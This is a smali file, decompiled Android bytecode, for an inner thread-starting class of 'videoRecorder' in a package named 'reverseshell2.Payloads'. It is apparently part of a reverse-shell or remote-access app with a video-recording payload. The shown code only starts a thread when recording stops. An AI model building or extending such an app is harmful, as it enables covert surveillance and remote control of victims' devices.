.class Lcom/example/reverseshell2/Payloads/videoRecorder$3;
.super Ljava/lang/Object;
.source "videoRecorder.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/example/reverseshell2/Payloads/videoRecorder;->videoStop(Ljava/io/OutputStream;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

.field final synthetic val$outputStream:Ljava/io/OutputStream;


# direct methods
.method constructor <init>(Lcom/example/reverseshell2/Payloads/videoRecorder;Ljava/io/OutputStream;)V
    .locals 0
    .param p1, "this$0"    # Lcom/example/reverseshell2/Payloads/videoRecorder;

    .line 205
    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$3;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    iput-object p2, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$3;->val$outputStream:Ljava/io/OutputStream;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 2

    .line 208
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/example/reverseshell2/Payloads/videoRecorder$3$1;

    invoke-direct {v1, p0}, Lcom/example/reverseshell2/Payloads/videoRecorder$3$1;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder$3;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 218
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 219
    return-void
.end method
